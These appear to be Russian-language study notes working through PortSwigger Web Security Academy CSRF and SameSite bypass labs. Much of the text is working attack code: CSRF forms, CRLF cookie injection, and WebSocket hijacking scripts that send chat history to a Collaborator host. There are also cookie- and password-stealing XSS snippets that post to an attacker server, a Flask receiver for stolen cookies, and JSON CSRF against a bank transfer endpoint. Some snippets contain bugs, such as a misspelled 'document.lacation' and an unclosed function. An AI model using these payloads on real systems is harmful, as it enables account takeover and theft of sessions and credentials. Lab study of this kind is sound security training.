4. Собираем URL: 
   ```
   https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=csrf@xss%26submit=1
   ```
   > Часть "&" редиректа нужно закодировать в URL -> "%26":
   > ```
   > https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=csrf@xss%26submit=1
   > ```
   > Проверим на себе - успешно.
5. Создаём скрипт на эксплойт сервере:
   > ```html
   > <script>
document.location='https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=csrf@xss%26submit=1'
</script>
   > ``` 

---

## Lab: SameSite Strict bypass via sibling domain

https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-restrictions-via-vulnerable-sibling-domains/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain

1. На сайте есть живой чат с WebSocket'ами, значит единственный вектор сейчас - перехват этого чата через CSWSH. Используем стандартный payload:
   
   ```html
   <script> var ws = new WebSocket('wss://your-websocket-url'); 
   ws.onopen = function() { ws.send("READY"); }; 
   ws.onmessage = function(event) { 
      fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); 
   }; 
   </script>
   ```
   > Он позволяет нам получить сообщения для новой сессии, но нам нужна старая. Для этого смотрим как вообще открывается страница с чатом (`GET /chat`). Можно заметить, что никакие куки не передаются на эту страницу:
   > ```http
   > GET /chat HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Connection: Upgrade
...
Upgrade: websocket
...
Sec-Websocket-Version: 13
...
Sec-Websocket-Key: WcjxbafO6Orir+MPx7lEqA==
   > ```
   > В ответ браузер выставляет Session Cookie с политикой `SameSite=Strict`:
   > ```http
   > HTTP/1.1 101 Switching Protocol
Set-Cookie: session=BPm4xh2hCZKP5iKx44Va8s10PWzgqAsb; Secure; HttpOnly; SameSite=Strict
...
   > ```

1. Найдём другие уязвимости на сайте. 
   > Изучим Site map в Burp. Заметим заголовок `Access-Control-Allow-Origin` с сайтом `https://cms-YOUR-LAB-ID.web-security-academy.net`. Откроем его и сразу видим пространство для XSS:
   > 
   > ![[Pasted image 20260123173112.png]]
1. Попробуем отсюда открыть WSS сессию той же нагрузкой, что была на эксплойт сервере - успех, мы видим историю.
2. В Burp находит тот `POST` запрос, через который мы закинул в username свой payload. Пробуем сменить метод на GET - успех. Копируем URL.
3. Вставляем в эксплойт сервер редирект на уязвимый поддомен:
   > ```html
   > <script>
document.location='https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=%3Cscript%3E+++++var+ws+%3D+new+WebSocket%28%27wss%3A%2F%2F0a8c005704fb880d8052033600970052.web-security-academy.net%2Fchat%27%29%3B++%09ws.onopen+%3D+function%28%29+%7B+ws.send%28%22READY%22%29%3B+%7D%3B++%09ws.onmessage+%3D+function%28event%29+%7B++%09%09fetch%28%27https%3A%2F%2Feygteiey6rnx8igdmgehnryywp2gq6ev.oastify.com%27%2C+%7Bmethod%3A+%27POST%27%2C+mode%3A+%27no-cors%27%2C+body%3A+event.data%7D%29%3B++%09%7D%3B++%3C%2Fscript%3E++%3Cscript%3E+++++var+ws+%3D+new+WebSocket%28%27wss%3A%2F%2F0a8c005704fb880d8052033600970052.web-security-academy.net%2Fchat%27%29%3B+++++ws.onopen+%3D+function%28%29+%7Bws.send%28%22READY%22%29%3B+%7D%3B+++++ws.onmessage+%3D+function%28event%29+%7B+++++++++fetch%28%27https%3A%2F%2Feygteiey6rnx8igdmgehnryywp2gq6ev.oastify.com%27%2C+%7Bmethod%3A+%27POST%27%2C+mode%3A+%27no-cors%27%2C+body%3A+event.data%7D%29%3B+++++%7D%3B+%3C%2Fscript%3E&password=123'
</script>
   > ```
   > Получаем в collaborator: `"...No problem carlos, it&apos;s b2tcm2bitkeq3e2ouciy"`

---

## Lab: SameSite Lax bypass via cookie refresh

https://portswigger.net/web-security/learning-paths/csrf/csrf-bypassing-samesite-lax-restrictions-with-newly-issued-cookies/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

1. В запросе `POST /my-account/change-email` Engagement tools / Generate CSRF PoC. (Проверяем на себе - работает.)
   > Проблема в этой лабораторной в том, что спустя 2 минуту после логина session cookie станут Lax и передать их через `POST` не получится. Нам необходимо сначала заставить пользователя перелогиниться.
2. В стандартный PoC просто добавляем открытие страницы логина и задержку:
   >```html
   > <html>
     > <!-- CSRF PoC - generated by Burp Suite Professional -->
     > <body>
     >   <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
     >     <input type="hidden" name="email" value="x4&#64;xss" />
   >       <input type="submit" value="Submit request" />
     >   </form>
   > <script>
   >     window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
     >   setTimeout(changeEmail, 5000);
   >     function changeEmail(){
     >       document.forms[0].submit();
     >   }
   > </script>
     > </body>
   > </html>
   >```

---

## Lab: CSRF where Referer validation depends on header being present

https://portswigger.net/web-security/learning-paths/csrf/csrf-validation-of-referer-depends-on-header-being-present/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present#

1. В запросе `POST /my-account/change-email`: Engagement tools / Generate CSRF PoC: ошибка "`Invalid referer header`";
2. Отключаем `Referer` через тег:
   > ```html
   > <meta name="referrer" content="never">
   > ```

---

## Lab: CSRF with broken Referer validation

https://portswigger.net/web-security/learning-paths/csrf/csrf-validation-of-referer-can-be-circumvented/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken#

1. В запросе `POST /my-account/change-email`: Engagement tools / Generate CSRF PoC: ошибка "`Invalid referer header`";
   > Без рефёрера выпадает ошибка;
2. В Burp пробуем `Referer` вида:
   >```http
   >Referer: site.com/?qwe=YOUR-LAB-ID.web-security-academy.net
   >```
   >Успех.
3. Устанавливаем тег:
   > ```html
   > <meta name="referrer" content="unsafe-url">
   > ```
4. Изменим функцию `history.pushState`, добавив 3й аргумент:
   > ```js
   > history.pushState("", "", "/?qwe=YOUR-LAB-ID.web-security-academy.net")
   > ```

---








# Вступление

CSRF атака возможна, если допущены ошибки в механизмах безопасности хранения cookie, генерации CSRF токена, защите через Referer.

![[Pasted image 20250113212910.png]]

---

## Разница Site и Origin

![[Pasted image 20250114182435.png]]
![[Pasted image 20250114182521.png]]

---
## Какими бывают Cookie - SameSite

>**SameSite** - механизм безопасности браузера, который определяет, когда cookie веб-сайта включаются в запросы, исходящие от других веб-сайтов. Ограничения cookie SameSite обеспечивают частичную защиту от различных межсайтовых атак, включая CSRF, межсайтовые утечки и некоторые эксплойты CORS.

|                           |                                |                       |                            |
| ------------------------- | ------------------------------ | --------------------- | -------------------------- |
| **Request from**          | **Request to**                 | **Same-site?**        | **Same-origin?**           |
| `https://example.com`     | `https://example.com`          | Yes                   | Yes                        |
| `https://app.example.com` | `https://intranet.example.com` | Yes                   | No: mismatched domain name |
| `https://example.com`     | `https://example.com:8080`     | Yes                   | No: mismatched port        |
| `https://example.com`     | `https://example.co.uk`        | No: mismatched eTLD   | No: mismatched domain name |
| `https://example.com`     | `http://example.com`           | No: mismatched scheme | No: mismatched scheme      |
![[SameSite ограничения.png]]
![[SameSite strict.png]]


---

# Exploiting cross-site scripting to steal cookies

[PayloadsAllTheThings - XSS - data-grabber-for-xs](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss)

Пример в CORS: 
```javascript
<script>
  fetch('https://{site.com}', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```
или
```html
<img src=x onerror=this.src="http://<my_server>:<port>/"+btoa(document.cookie)>
```
#### Exploiting cross-site scripting to capture passwords
Здесь представлена форма, которая ожидает ввода логина и пароля, и сказу отправляет из в коллаборатор.
```javascript
<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method:'POST', mode:'no-cors', body:username.value+':'+this.value });">
```
### Python web-server to take cookie:
```python
from flask import Flask, request

app = Flask(__name__)

@app.route('/', methods=['POST'])
def handle_post():
	message = request.data.decode('utf-8')
	print("Received message:", message)
	return 'Message recieved'
if __name__ == '__main__':
	app.run(port=8080)
```
#### Atack payload
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: 'message=Hello', headers: { 'Content-Type': 'text/plain' }});" style="display: none;">
```
```javascript
<iframe src="javascript:fetch('http://localhost:8080', { method: 'POST', body: document.cookie, headers: { 'Content-Type': 'text/plain' }});" style="display: none;">
```

---

# CSRF без всякой защиты (use exploit server)

https://portswigger.net/web-security/csrf/lab-no-defenses

Repeater -> Engagement tools -> Generate CSRF PoC 
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0afc009604f04a3c817484ab003500e8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="zxc&#64;zxc&#46zxc" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

---
# CSRF уязвимости токена

---

## Exploiting XSS to perform CSRF
**Пользователь**, зашедший на страницу с **xss**, направит запрос и свой **csrf токен** на смену **email** на **'/my-account/change-email'**, если **токен** висит в **html**.
```javascript
<script>  
var req = new XMLHttpRequest();  
req.onload = handleResponse;  
req.open('get','/my-account',true);  
req.send();  
function handleResponse() {  
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];  
var changeReq = new XMLHttpRequest();  
changeReq.open('post', '/my-account/change-email', true);  
changeReq.send('csrf='+token+'&email=test@test.com')  
};  
</script>
```

---
## CSRF, когда проверка токена зависит от метода запроса (use exploit server)

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method

1. Repeater -> Change request method
2. Repeater -> Engagement tools -> Generate CSRF PoC
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a89008e03d199f389c89f8100bb0096.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="zxc&#64;zxc&#46;zxc" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

---

## CSRF, когда проверка токена зависит от его наличия (use exploit server)

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

just delete csrf token.
1. Repeater -> Change request method
2. Repeater -> Engagement tools -> Generate CSRF PoC

---

## CSRF, когда токен не привязан к сессии пользователя (use exploit server)

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session

Использовать свой токен в эксплойте на сервере
1. Proxy -> Intercept -> Intercept is off (to on) -> go to repeter
2. Repeater -> Engagement tools -> Generate CSRF PoC

---
## CSRF, когда токен привязан к не сеансовому cookie или дублирует не сеансовый cookie

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie

Нужно в форме подвязать свои не сеансовые cookie. Это возможно, если найти пользовательский input, который недостаточно валидирован и передаёт своё значение в header ответа. 

Пусть существует возможность сделать поисковый запрос на сайте:
```http
GET /?search=qwe HTTP/2
Host: 0a5000e0034cd7ff82dc2511007f007e.web-security-academy.net
Cookie: csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi; session=fZSQ6mf9BoFyRGfEoI4q9WAYTTjG8Kaw
...
```
И получить ответ:
```http
HTTP/2 200 OK
Set-Cookie: LastSearchTerm=qwe; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3419

<!DOCTYPE html>
<html>
...
```
Тогда можно переписать запрос, вставив в него нужный нам `Set-Cookie`:
```http
GET /?search=q%0D%0ASet-Cookie:%20csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi%20Same-Site=None HTTP/2
Host: 0a5000e0034cd7ff82dc2511007f007e.web-security-academy.net
Cookie: csrfKey=LAKDqGn6ShUWMc54eSO2ZV176pPOh7Fi; session=fZSQ6mf9BoFyRGfEoI4q9WAYTTjG8Kaw
...
```
Тогда пэйлоадом будет выступать:
1. Repeater -> Engagement tools -> Generate CSRF PoC = $FORM
```html
$FORM
<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()" />
```

---

---
## Обход SameSite Lax через переопределение метода (use exploit server)

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override

Может быть полезным Burp расширение: `Param Miner`.

Сначала пробуем переопределить метод запроса с POST на GET:
1. Repeater->Change request method
2. Пробуем параметр **`&_method=POST`**: GET /my-account/change-email?email=q%40q.q**`&_method=POST`** HTTP/2
Эксплойт:
```javascript
<script>
document.location="https://{site.com}/change-email?email=q%40q.q&_method=POST"
</script>
```

---
## Обход SameSite Lax через обновление cookie (use exploit server)

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh

Cookies с ограничениями Lax SameSite обычно не отправляются в межсайтовых POST-запросах, но есть и исключения.  
  
Если веб-сайт не включает атрибут SameSite при установке cookie, Chrome автоматически применяет ограничения Lax по умолчанию. Однако, чтобы не нарушать механизмы единой авторизации (SSO), он не применяет эти ограничения в течение первых 120 секунд для POST-запросов верхнего уровня. В результате в течение двух минут пользователи могут быть подвержены межсайтовым атакам.

В лабораторной работе настроен механизм авторизации через сторонний сервис. Значит если мы обновим ограничение первых 120 секунд, вызываемое при авторизации через сторонний сервис, то сможем воспользоваться  cookie.

1. Repeater -> Engagement tools -> Generate CSRF PoC = $FORM
```javascript
$FORM
<script>
	window.open('https://{site.com}/social-login');
	setTimeout(changeEmail, 5000);

	const changeEmail = () => document.forms[0].submit();
	/* или
	function changeEmail() {
		document.forms[0].submit();
	}
	*/
</script>
```

---

## SameSite Strict - перенаправление на стороне клиента (use exploit server)

https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

Допустим на сайте есть скрипт:
```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```
В таком случае можно использовать open redirect - маршрут по изменению email в параметре postId:
```http
GET /site.com/?postId=../../../{маршрут на смену email}
```
Далее просто проэксплуатирвоать нагрузку:
```javascript
<script>
	document.lacation = 'https://site.com/?postId=../../../{маршрут на смену email}'
</script>
```
По сути нужно лишь проэксплуатировать open redirect, если он есть на сайте.

---
## SameSite Strict через дочерний домен ([cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)))
https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
Допустим есть сервер с живым чатом, использующий веб-сокеты для загрузки контента даже неавторизованного пользователя. Можно открыть CSRF соединение искусственно на своём explit сервере:

``` javascript
<script>
var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; 
ws.onmessage = function(event) { 
	fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
</script>
```
В итоге в тело запроса колобаратора попадёт подтверждение наличия уязвимости CSWSH.
С помощью Target -> Site map можно изучить веб-ресурс и поискать сторонние домены, например в js скриптах или html. В данной лабораторной оказывается уязвимый поддомен с XSS. 

На уязвимом сайте делаем XSS в GET запросе с закодированным в URL скриптом выше.
```http
https://cms-0ae4007f048e205982bcbfed00bc0073.web-security-academy.net/login?username=%3Cscript%3E{here code upper}%3C/script%3E&password=q
```

---
# Валидация заголовка Refere

## CSRF, когда проверка Referer зависит от наличия заголовка
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
1. Если убрать заголовок Referer, то возможно, что уязвимость проэксплуатируется.
2. Repeater -> Engagement tools -> Generate CSRF PoC
3. Добавляет тег `<meta name="referrer" content="no-referrer">`

---

## CSRF с нарушенной проверкой Referer
https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
Допустим есть следующий параметр:
```
Referer: https://www.originSite.com/my-account?id=wiener
```
пробуем изменить его, получаем всё ещё рабочий Referer:
```
Referer: https://google.com?https://www.originSite.com/my-account?id=wiener
```
1. Repeater -> Engagement tools -> Generate CSRF PoC
2. В форме меняем аргументы pushState, добавляя `?`+`originRegerer`
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a28001a0421cd37808adad500f500b1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="qwe&#64;qwe&#46;qwe" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/?https://www.originSite.com/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
3. Header на explit server-е должен содержать заголовок:
```
Referrer-Policy: unsafe-url
```
	чтобы браузер позволил передать get параметр в функции pushState.

# CSRF с JSON

## Pre-fight Request

> Чтобы не вызвать предполётный запрос, нужно:
> 1. **Метод:** GET, POST, HEAD.
> 2. **HTTP-заголовки:** помимо автоматически добавляемых заголовков по умолчанию, можно установить только безопасные заголовки CORS.
> 3. **Тип контента:** должен быть "application/x-www-form-urlencoded", "text/plain", "multipart/form-data". ReadableStram: не открывать ReadableStram в запросе.
> 4. **Нет прослушивателей XMLHttpRequestUpload**
> 
> Можно проверить сайт на 4 ситуации:
> 1. **Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы. [[#**Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы.|1.]]
>2. **Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы. [[#**Content-Type не проверяется** на стороне сервера, но **проверяются данные POST** - правильно ли они отформатированы или нет.|2.]]
>3. С помощью запроса XMLHTTP/запроса AJAX: когда **Content-Type проверяется** на стороне сервера, и сервер принимает только "Content-Type: "application/json". [[#С помощью запроса XMLHTTP/запроса AJAX когда **Content-Type проверяется** на стороне сервера, и сервер принимает только "Content-Type "application/json".|3.]]
>4. С помощью файла FLASH: когда **Content-Type проверяется** на стороне сервера и сервер принимает **только "Content-Type: application/json"**, а **CORS также настроен правильно**. [[#С помощью файла FLASH когда **Content-Type проверяется** на стороне сервера и сервер принимает **только "Content-Type application/json"**, а **CORS также настроен правильно**|4.]]

##### **Content-Type не проверяется** на стороне сервера, а также **не проверяются данные POST**, правильно ли они отформатированы.

В следующей форме отправляется в качестве параметра input text/plain, в name которого находится нужный нам JSON.
```html
<html>  
<body>  
<form action=”[https://members.bankofdirectdefense.com/accounts/transfer](https://members.bankofdirectdefense.com/accounts/transfer)" method=”POST” enctype=”text/plain”>  
<input type=”hidden” name=”{\”from-account\”: 1,\”toAccount\”: \”021000021–9876543210\”,\”amount\”: 1000,\”currency\”: \”USD\”,\”foo” value=”\”:\”bar\”}” />  
</form>  
<script>document.forms[0].submit();</script>  
</body>  
</html>
```

##### **Content-Type не проверяется** на стороне сервера, но **проверяются данные POST** - правильно ли они отформатированы или нет.

```html
<html>  
<title>JSON CSRF POC</title>  
<body>  
<center>  
<h1> JSON CSRF POC </h1>  
<script>  
fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});  
</script>  
<form action="#">  
<input type="button" value="Submit" />  
</form>  
</center>  
</body>  
</html>
```


##### С помощью запроса XMLHTTP/запроса AJAX: когда **Content-Type проверяется** на стороне сервера, и сервер принимает только "Content-Type: "application/json".

* Заголовок "Content-Type" должен быть разрешен сервером, чтобы мы могли добавить пользовательский заголовок, который браузер напрямую не позволяет нам добавить. Запрашиваемые Method и Origin также должны быть разрешены сервером. Проверьте ответ префлайта.  
* "Access-Control-Allow-Credential" должен быть true.  
* ACAO (Access-Control-Allow-Origin) не должно быть статическим. Приложение динамически устанавливает ACAO на происхождение запроса. Согласно спецификациям CORS, значение wildcard в паре с ACAC (Access-Control-Allow-Credential), установленным в true, приведет к ошибке.

```html
<html>  
<body>  
<script>  
function submitRequest()  
{  
var xhr = new XMLHttpRequest();  
xhr.open("POST", "https:\/\/members.bankofdirectdefense.com\/accounts\/transfer", true);  
xhr.setRequestHeader("Content-Type", "application\/json");  
xhr.withCredentials = true;  
xhr.send("{\"from-account\": 1,\"toAccount\": \"021000021-9876543210\",\"amount\": 1000,\"currency\": \"USD\"}");  
submitRequest();  
</script>  
</body>  
</html>
```

##### С помощью файла FLASH: когда **Content-Type проверяется** на стороне сервера и сервер принимает **только "Content-Type: application/json"**, а **CORS также настроен правильно**
https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b